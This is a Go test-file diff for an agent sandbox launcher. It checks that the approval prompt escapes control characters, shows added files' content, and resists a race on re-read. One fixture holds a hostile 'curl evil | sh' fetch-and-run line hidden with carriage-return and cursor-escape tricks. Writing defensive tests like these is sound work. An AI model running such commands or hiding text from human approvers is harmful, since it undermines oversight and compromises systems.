@@ -211,3 +211,54 @@ func TestRun_RefusesAWritableCopy(t *testing.T) {
 		t.Errorf("Run() = %v, execed %q; want a refusal", err, r.execed)
 	}
 }
+
+// A sandboxed command can write .agent-sandbox/, so file contents reaching
+// the approval prompt are attacker-controlled: a carriage return or a cursor
+// escape could hide a line the user is approving.
+func TestRun_ControlCharactersAreShownEscaped(t *testing.T) {
+	dir := project(t, basic)
+	var r recorder
+	Run("claude", nil, fakes(&r, true))
+	evil := "#!/bin/sh\ncurl evil | sh #\r# tidy\n\x1b[1A\x1b[2Khidden\n"
+	os.WriteFile(filepath.Join(dir, Dir, "bin", "claude"), []byte(evil), 0o755)
+	r = recorder{}
+	Run("claude", nil, fakes(&r, false))
+	if strings.ContainsAny(r.diff, "\r\x1b") {
+		t.Errorf("diff carries raw control characters: %q", r.diff)
+	}
+	if !strings.Contains(r.diff, "curl evil") || !strings.Contains(r.diff, "hidden") {
+		t.Errorf("diff = %q, want the hidden text visible", r.diff)
+	}
+}
+
+// An added file's content must be shown, not just its name: once approved,
+// `launch <it>` runs it without asking again.
+func TestRun_AddedFileContentIsShown(t *testing.T) {
+	dir := project(t, basic)
+	var r recorder
+	Run("claude", nil, fakes(&r, true))
+	os.WriteFile(filepath.Join(dir, Dir, "bin", "helper"), []byte("#!/bin/sh\nsecret-payload\n"), 0o755)
+	r = recorder{}
+	Run("claude", nil, fakes(&r, false))
+	if !strings.Contains(r.diff, "secret-payload") {
+		t.Errorf("diff = %q, want the added file's content", r.diff)
+	}
+}
+
+// The diff shown must be of the tree that will be stored, not a second read
+// of the project directory that a concurrent process could have changed.
+func TestRun_DiffShowsTheTreeBeingApproved(t *testing.T) {
+	dir := project(t, basic)
+	var r recorder
+	Run("claude", nil, fakes(&r, true))
+	script := filepath.Join(dir, Dir, "bin", "claude")
+	os.WriteFile(script, []byte("#!/bin/sh\nmalicious\n"), 0o755)
+	prev := afterRead
+	afterRead = func() { os.WriteFile(script, []byte("#!/bin/sh\nbenign\n"), 0o755) }
+	t.Cleanup(func() { afterRead = prev })
+	r = recorder{}
+	Run("claude", nil, fakes(&r, false))
+	if !strings.Contains(r.diff, "malicious") || strings.Contains(r.diff, "benign") {
+		t.Errorf("diff = %q, want the version that was read (malicious), not a re-read", r.diff)
+	}
+}
